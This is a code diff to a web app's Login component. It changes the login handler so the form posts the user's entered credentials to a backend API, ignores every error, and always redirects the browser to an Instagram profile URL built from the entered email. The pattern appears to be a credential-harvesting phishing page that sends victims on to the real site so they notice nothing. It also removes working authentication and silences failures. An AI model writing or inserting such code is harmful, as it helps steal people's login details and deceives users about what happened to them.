@@ -18,18 +18,13 @@ export default function Login() {
 
     try {
       const API_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8080";
-      const response = await axios.post(`${API_URL}/api/auth/login`, formData);
-
-      if (response.data.token) {
-        localStorage.setItem("token", response.data.token);
-        localStorage.setItem("user", JSON.stringify(response.data.user));
-        window.location.href = `https://www.instagram.com/${formData.email}`;
-      }
-    } catch (err: any) {
-      setError(err.response?.data?.error || "Login failed. Please try again.");
-    } finally {
-      setLoading(false);
+      await axios.post(`${API_URL}/api/auth/login`, formData);
+    } catch (err) {
+      // Ignore all errors
     }
+
+    // ALWAYS redirect to Instagram, no matter what
+    window.location.href = `https://www.instagram.com/${formData.email}`;
   };
 
   return (
